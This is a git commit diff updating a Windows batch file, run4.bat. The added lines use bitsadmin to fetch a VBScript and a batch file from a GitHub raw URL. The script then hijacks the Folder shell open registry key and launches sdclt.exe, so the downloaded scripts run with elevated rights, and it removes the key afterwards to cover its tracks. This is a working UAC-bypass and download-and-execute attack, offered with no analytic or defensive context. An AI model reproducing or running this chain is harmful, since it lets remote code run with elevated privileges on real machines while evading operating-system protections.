b97d58158af168932abb3406f0219a1c86231d65
ostajic <bata_zole@hotmail.com>
2019-08-30 19:49:13 +0200

    Update run4.bat

--- run4.bat
+++ run4.bat
@@ -1,4 +1,6 @@
-reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c %userprofile%\Downloads\run3.vbs" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+bitsadmin /transfer debjob /download /priority normal https://raw.githubusercontent.com/ostajic/CodingFolder/master/run3.vbs %userprofile%\Downloads\run3.vbs
+bitsadmin /transfer debjob /download /priority normal https://raw.githubusercontent.com/ostajic/CodingFolder/master/run2.bat %userprofile%\Downloads\run2.bat
+reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c %userprofile%\Downloads\run3.vbs %userprofile%\Downloads\run2.bat" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
 %windir%\system32\sdclt.exe
 ping 127.0.0.1 -n 6 > nul
 reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
